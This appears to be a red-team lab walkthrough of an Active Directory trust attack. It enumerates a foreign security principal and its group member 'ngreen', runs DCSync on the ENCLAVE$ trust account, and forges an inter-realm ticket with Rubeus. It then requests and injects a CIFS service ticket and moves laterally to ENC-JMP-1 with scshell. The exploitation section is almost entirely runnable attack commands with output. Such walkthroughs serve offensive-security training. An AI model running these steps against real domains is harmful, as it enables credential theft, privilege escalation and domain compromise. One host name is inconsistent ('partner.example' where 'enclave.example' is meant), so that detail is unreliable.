### Enumeration

With control over the root-domain DC, enumeration is aimed at identifying how the trust with `enclave.example` is materialized and which identities from the source domain are projecting administrative permissions into the remote domain

1. FQDN and SID of the current domain

```powershell
ldapsearch (objectClass=domain) --attributes distinguishedName
# distinguishedName: DC=contoso,DC=com
# lon-dc-1.contoso.example

ldapsearch (objectClass=domain) --attributes objectSid
# S-1-5-21-1076548718-1118529210-2193484809
```

The source domain SID is obtained, which is essential for building tickets and correctly understanding relationships between local and external principals.

2. Enumerate FSPs (external SIDs the local domain is using)

```powershell
ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname enclave.example --dn DC=contoso,DC=enclave
# cn: S-1-5-21-1076548718-1118529210-2193484809-2601
```

The presence of a `ForeignSecurityPrincipal` indicates that ENCLAVE is consuming an external SID originating from CONTOSO.

3. Resolve the external SID and determine which CONTOSO group it represents

```powershell
ldapsearch (objectSid=S-1-5-21-1076548718-1118529210-2193484809-2601) --attributes objectClass,sAMAccountName,distinguishedName
# objectClass: top, group
# sAMAccountName: Enclave Access
# distinguishedName: CN=Enclave Access,CN=Users,DC=contoso,DC=com
```

That external SID corresponds to the `Enclave Access` group in `contoso.example`.

This means ENCLAVE is not delegating privileges to isolated users, but to a group from the remote domain. Therefore, any current or future member of that group inherits the access projected onto the trusted domain.

4. Enumerate users in the "Enclave Access" group to identify who obtains permissions in ENCLAVE through the FSP and its RID

```powershell
ldapsearch "(cn=Enclave Access)" --attributes member
# member: CN=Nikki Green,CN=Users,DC=contoso,DC=com

powerpick net group "Enclave Access" /domain
# ngreen

ldapsearch "(sAMAccountName=ngreen)" --attributes objectSid
# S-1-5-21-1076548718-1118529210-2193484809-3601
```

It is confirmed that `ngreen` is an effective member of the `Enclave Access` group

> `ngreen` is a principal from the root domain that inherits real privileges over the `enclave.example` domain through the associated FSP.

5. Enumeration of hosts in the remote domain `partner.example` (to determine which host to target with the Silver)

```powershell
ldapsearch (samAccountType=805306369) --attributes samAccountName --dn DC=contoso,DC=enclave --hostname enclave.example
# sAMAccountName: ENC-DC-1$
# sAMAccountName: ENC-FS-1$
# sAMAccountName: ENC-JMP-1$
```

> In this case, because there is a group named `Enclave Access`, we assume the host to target is `ENC-JMP-1$` (assuming it does not validate the PAC)

6. NTLM hash of the trust account

```powershell
dcsync contoso.example CONTOSO\ENCLAVE$
# Hash NTLM: REDACTED_HASH
```

`DCSync` on the `ENCLAVE$` trust account provides the material needed to forge inter-realm tickets

### Exploitation

1. Inter-realm TGT forging

```powershell
# HOST ATTACK WINDOWS
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:ngreen /domain:contoso.example /sid:S-1-5-21-1076548718-1118529210-2193484809 /id:3601 /groups:513,1106,2601 /service:krbtgt/enclave.example /rc4:REDACTED_SECRET /nowrap 
```

An inter-realm trust ticket for `ngreen` is forged, signed with the secret of the `CONTOSO\ENCLAVE$` trust account.

2. TGS request in the remote domain

```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/enc-jmp-1.enclave.example /dc:enc-dc-1.enclave.example /nowrap /ticket:
```

With that ticket, a TGS is requested for `cifs/enc-jmp-1.enclave.example`.

3. Injection and access

```powershell
# Inject the ticket
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:

# Verify loaded tickets
run klist
# Client: ngreen @ contoso.example
# Server: cifs/enc-jmp-1.enclave.example @ enclave.example

# Access the resource (e.g., SMB share)
ls \\enc-jmp-1.enclave.example\c$

# Lateral movement
jump scshell64 enc-jmp-1.enclave.example smb
```

- effective administrative access over `ENC-JMP-1`
- materialization of the trust as real lateral movement
- transition from trust abuse to operational compromise of the remote domain
